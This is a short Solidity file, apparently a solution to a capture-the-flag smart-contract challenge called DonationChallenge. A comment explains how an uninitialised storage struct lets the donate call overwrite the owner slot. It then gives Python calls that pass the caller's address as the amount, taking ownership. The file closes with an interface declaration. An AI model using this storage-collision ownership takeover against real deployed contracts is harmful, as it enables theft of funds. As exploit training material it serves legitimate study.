/*


in the donate function, the Donation struct declaration defaulta to storage slot 0 and the etherAmount will write to 
slot 1 which is the owner.

call the donate function with etherAmount =  youraddress and the value to send is your address divided by 1e36

ethAmount = web3.toInt(hexstr=a[0].address)

don = interface.DonationChallenge("ContractAddress")

don.donate(ethAmount,{'from':a[0],'value' : ethAmount/1e36})

10e36 is used since the scale is 10 ** 18 * 1 ether = 1e36

*/
pragma solidity 0.8.6;

interface DonationChallenge {
    

    function donate(uint256 etherAmount) payable external;

    function withdraw() external;
     
}